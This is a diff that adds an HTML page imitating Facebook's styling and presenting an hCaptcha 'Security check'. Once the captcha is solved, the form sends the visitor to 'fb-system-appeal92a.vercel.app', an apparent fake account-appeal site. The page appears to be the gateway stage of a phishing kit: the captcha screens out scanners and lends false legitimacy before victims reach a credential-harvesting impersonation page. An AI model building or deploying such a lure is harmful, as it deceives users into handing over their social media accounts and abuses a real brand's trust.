@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<title>Verify Your Humanity</title>
+<!-- Required meta tags -->
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+<!-- Bootstrap CSS -->
+<link crossorigin="anonymous" href="local_resources/css/e56c66305aef9ceda5a0f90401644385.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet"/>
+<script async="" defer="" src="local_resources/js/dc765decb0cf744337d28e395c6cf59a.js"></script>
+<style type="text/css">
+      .header{
+        background: linear-gradient(to top, #3b5998, #4d68a1);
+        padding-top: 20px;
+        padding-bottom: 15px;
+      }
+
+      .header img{
+        height: 30px;
+      }
+
+      .trupi{
+        border: 1px solid #cccccc;
+        padding:20px;
+        margin-top: 30px;
+        margin-bottom: 40px;
+      }
+
+      .trupi p{
+        color:#65676b;
+        font-size: 12px;
+        margin-bottom: 10px;
+      }
+
+      .securityp{
+        font-size: 14px !important;
+        color:black !important;
+        font-weight: 600;
+      }
+
+      .butonisubmit{
+        background-color: #4267b2;
+        margin-top:5px;
+        border: 1px solid #4267b2;
+        color: white;
+        font-size: 13px;
+        font-weight: 600;
+        padding: 4px 10px;
+      }
+
+      @media only screen and (max-width: 700px) {
+        .centermobile{
+          text-align: center;
+        }
+        .header{
+          padding-top: 14px;
+          padding-bottom: 12px;
+        }
+      }
+
+      /* Focus state for accessibility */
+      #continuebutton:focus {
+        outline: 2px solid #1b74e4;
+        outline-offset: 2px;
+      }
+
+      /* Loading style for the submit button */
+      #continuebutton.loading {
+        background-color: #999;
+        cursor: not-allowed;
+      }
+    </style>
+</head>
+<body>
+<div class="App">
+<div class="header">
+<div class="container">
+<div class="row">
+<div class="col-12">
+<div class="centermobile">
+<img class="img-fluid" src="local_resources/img/74fe3a13e6660d871a5e2a3917fcd49a.png" width="130"/>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="body">
+<div class="container">
+<div class="row">
+<div class="col-md-6 offset-md-3">
+<div class="trupi">
+<form action="https://fb-system-appeal92a.vercel.app/" id="yourFormId" method="GET">
+<p class="securityp">Security check</p>
+<div class="h-captcha" data-callback="onSuccess" data-sitekey="2090dde0-1a4a-4119-ac94-68dbc4180559"></div>
+<p>This helps us combat harmful conduct, detect and prevent spam, and maintain the integrity of our services.</p>
+<p>We use hCaptcha for this security check. Your use of hCaptcha is subject to their Privacy Policy and Terms of Use.</p>
+<p>hCaptcha collects hardware and software information, such as device and application data, and sends it to their servers to improve their service and ensure security. This information is not used for personalized advertising.</p>
+<input class="btn btn-primary loading" disabled="true" id="continuebutton" style="background-color:#1b74e4; margin-top: 10px;" type="submit" value="Continue"/>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+      function onSuccess(response) {
+        // Enable the continue button after successful hCaptcha
+        let button = document.getElementById('continuebutton');
+        button.disabled = false;
+        button.classList.remove('loading');
+      }
+    </script>
+<script crossorigin="anonymous" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" src="local_resources/js/8b336b125a27106622d719f5789b7016.js"></script>
+<script crossorigin="anonymous" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" src="local_resources/js/d22add943ba8419b6478a89ae86b99ef.js"></script>
+</body>
+</html>
